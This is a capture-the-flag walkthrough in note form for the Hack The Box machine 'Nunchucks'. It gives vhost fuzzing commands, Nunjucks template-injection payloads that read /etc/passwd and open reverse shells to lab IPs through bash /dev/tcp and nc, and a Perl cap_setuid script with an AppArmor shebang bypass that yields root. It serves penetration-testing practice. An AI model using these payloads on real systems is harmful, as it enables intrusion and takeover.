### VHOST
##### autorecon
```bash
autorecon nunchucks.htb -p 80,443
```

##### mannualy wfuzz or gobuster
```bash
wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb 
```

```bash
gobuster vhost -u https://nunchucks.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

### Open a new tab via it after addding to host
https://store.nunchucks.htb/

### Burp to shell
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks

```txt burp
{"email":"{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"tail /etc/passwd\")')()}}@b.com"}

{"email":"{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjEzLzQ0MyAwPiYx | base64 -d | bash\")')()}}@b.com"}

{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f')\")()}}
```

Grab SSH keys also worked.

### Enum
But since only root can write to `/opt/web_backups`, it’s using `POSIX::setuid(0)` to run as root.

To do this, it must either be SUID or have a capability. It has the `setuid` capability:

```bash
david@nunchucks:/opt$ which perl
/usr/bin/perl
david@nunchucks:/opt$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep

david@nunchucks:/opt$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
```

https://gtfobins.github.io/gtfobins/perl/#capabilities

### AppArmor Config
Apparmor is a way to define access controls much more granularly to various binaries in Linux. There are a series of binary-specific profiles in `/etc/apparmor.d`:

### Root
https://bugs.launchpad.net/apparmor/+bug/1911431

Shebang bypass

When Linux tries to load the script as executable, that line tells it what interpreter to use. For some reason, the AppArmor developers don’t believe that the rules for the interpreter should apply there, and so they don’t.
```bash
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";

"b.pl" [New] 4L, 74C written                        
david@nunchucks:/dev/shm$ perl b.pl 
Can't open perl script "b.pl": Permission denied
david@nunchucks:/dev/shm$ chmod +x b.pl 
david@nunchucks:/dev/shm$ ./b.pl 
root@nunchucks:/dev/shm# id
uid=0(root) gid=1000(david) groups=1000(david)
```

### Writeups
https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html